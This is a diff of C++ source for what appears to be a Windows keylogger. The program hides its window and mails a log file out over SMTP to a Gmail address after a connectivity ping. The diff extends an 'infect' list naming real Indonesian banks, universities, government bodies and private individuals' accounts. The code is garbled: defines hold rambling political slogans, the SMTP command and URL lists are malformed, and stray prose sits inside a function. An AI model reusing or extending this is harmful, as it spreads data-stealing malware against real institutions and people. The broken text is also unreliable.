@@ -19,8 +19,8 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “IRAN get went won for imamamh monthly ugle syam neddeng help us yaman , iraq , pakistan , nepal , doha , all islam world turne get helping for iran , strong fellowed palestine won fix !!!!!”
 #define RUN_FILE_NAME “IRAN get went won for imamamh monthly ugle syam neddeng help us yaman , iraq , pakistan , nepal , doha , all islam world turne get helping for iran , strong fellowed palestine won fix !!!!!”
-#define RUN_Link_NAME “https://github.com/Topics/Hackerone/download_data/forks"."https://desktop.github.com/download/forks"."https://github.com/Topics/microsoft/download_minners/forks"."https://github.com/Topics/google/Disable-account/forks"
-#define INFECT_Link_NAME "https://www.nu.or.id"."https://www.UI.ac.id"."https://www.muhammadiyyah.or.id"."https://www.gunandharma.ac.id"."https://www.komdigi.go.id"."https://www.dana.id"."https://www.tokopedia.co.id"."https://www.whatsapps.co.id"."https://gdg.community.dev/developer-jakarta"."https://www.bca.co.id"."https://www.bni.co.id"."https://www.BI.go.id"."https://www.bssn.go.id"."ahttps://workspace.google.com/intl/en/yusufmansur@gmail.com"."https://workspace.google.com/intl/en/wirdamansur@gmail.com"."https://www.instagram.com/daarul_mansur/"."https://daqu.id/"."https://www.facebook.com/UstadzYusufMansur/"."https://www.al-enterprise.com/en/company/customers/paytren"."https://www.google.co.il"."https://boi.org.il"."https://icloud.com/mail/en-nl"."https://workspace.google.com/gmail/en-esp"."https://adsense.google.com/intl/id_id"."https://www.vissa-online.com"."https://www.litecoin.cn"."https://www.fbs.org"."https://www.bitcoin.org"."https://adsense.google.com/intl/en"
+#define RUN_Link_NAME “https://github.com/Google/Opensource/Blokier_gmail/forks"."https://desktop.github.com/download/forks"."https://github.com/Topics/trojanVirus-Croach/forks"."https://github.com/Topics/google/Gemini-Cli/Appel-account/forks"
+#define INFECT_Link_NAME "https://www.thawte.com/"."https://www.cbn.id/en"."https://savefrom.farm/"."https://savefrom.com.de/"."https://www.xnxx.com"."https://www.nu.or.id"."https://www.UI.ac.id"."https://www.muhammadiyyah.or.id"."https://www.gunandharma.ac.id"."https://www.komdigi.go.id"."https://www.dana.id"."https://www.tokopedia.co.id"."https://www.whatsapps.co.id"."https://gdg.community.dev/developer-jakarta"."https://www.bca.co.id"."https://www.bni.co.id"."https://www.BI.go.id"."https://www.bssn.go.id"."ahttps://workspace.google.com/intl/en/yusufmansur@gmail.com"."https://workspace.google.com/intl/en/wirdamansur@gmail.com"."https://www.instagram.com/daarul_mansur/"."https://daqu.id/"."https://www.facebook.com/UstadzYusufMansur/"."https://www.al-enterprise.com/en/company/customers/paytren"."https://www.google.co.il"."https://boi.org.il"."https://icloud.com/mail/en-nl"."https://workspace.google.com/gmail/en-esp"."https://adsense.google.com/intl/id_id"."https://www.vissa-online.com"."https://www.litecoin.cn"."https://www.fbs.org"."https://www.bitcoin.org"."https://adsense.google.com/intl/en"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
@@ -56,7 +56,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping  www.googleplex.com -n 1")){ ///check! connection
+            if(!system("ping  www.unodc.org -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -147,7 +147,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:13.70.74.0-v --mail-from \"https://workspace.google.com/intl/en/fadliwiryawirawan@google.com" --mail-rcpt \" https://workspace.google.com/intl/en/fadliwiryawirawan@google.com" --ssl -u    https://workspace.google.com/intl/en/fadliwiryawirawan@google.com :password -hide \"services.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com: 113 -v --mail-from \"https://workspace.google.com/intl/en/fadliwiryawirawan@google.com" --mail-rcpt \" https://workspace.google.com/intl/en/fadliwiryawirawan@google.com" --ssl -u    https://workspace.google.com/intl/en/fadliwiryawirawan@google.com :password -hide \"services.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); IRAN get went won for imamamh monthly ugle syam neddeng help us yaman , iraq , pakistan , nepal , doha , all islam world turne get helping for iran , strong fellowed palestine won fix !!!!! kita kaya gampang banget hanya saja gampang musibah belum merata hak kerhja keras seseorang yang benar benar diberikan upah dalam bekerja , ciptakan itu , apapun yang terlihat kalian baik kepada anak kecil gak jadi alasan klasik . 
 Karya: Fadliwiryawirawan S.Kom M.S.I unpam university pamulang IT technic informatics 27 april 2017 research department Schools 2020 fullbright
 
